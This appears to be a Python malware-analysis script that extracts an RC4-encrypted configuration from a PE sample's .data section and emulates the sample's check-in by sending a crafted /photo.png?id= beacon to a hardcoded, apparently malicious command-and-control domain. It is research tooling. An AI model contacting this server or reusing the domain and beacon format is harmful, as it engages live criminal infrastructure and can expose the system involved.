from arc4 import ARC4
import pefile
import requests
import binascii

class Emulator():

		def __init__(self, url):
			self.url = url

		def build_url(self):
			# 1
			# fb333d1 1E3D33FB
			config_val = 0x1E3D33FB
			timestamp = 0x3A298D54
			pcinfo = "0000000000FF40000006" 
			# 10x "0"
			# 2x F
			# process information - 40000000
			#pc_info_placeholder = "%0.2X%0.2X%0.2X%0.2X%0.2X%0.2X%0.8X"
			placeholder = "/photo.png?id=%0.2X%0.8X%0.8X%s"

			placeholder = placeholder % (1, config_val, timestamp, pcinfo  )
			packet_to_sent = self.url + placeholder
			return packet_to_sent

		def send_request(self, data):
			r = requests.get(url=data)

class Config_Extract():

	def __init__(self, filename):
		self.filename = filename

	def rc4_decrypt(self, key, data):

		cipher = ARC4(key)
		decrypted = cipher.decrypt(data)
		return decrypted

	def config_extract(self):

		pe = pefile.PE(self.filename)
		for section in pe.sections:
			if b".data" in section.Name:
				return section.get_data()
	#return None

def main():

	filename = input("Filename: ")

	extractor = Config_Extract(filename)
	data = extractor.config_extract()
	key = data[:8]
	data = data[8:592] # from offset 8 to offset 592

	print (extractor.rc4_decrypt(key, data))

	emulate = Emulator("https://boldidiotruss.xyz") #https
	data_to_send = emulate.build_url()
	#print(emulate.build_url())
	emulate.send_request(data_to_send)

if __name__ == "__main__": 
	main()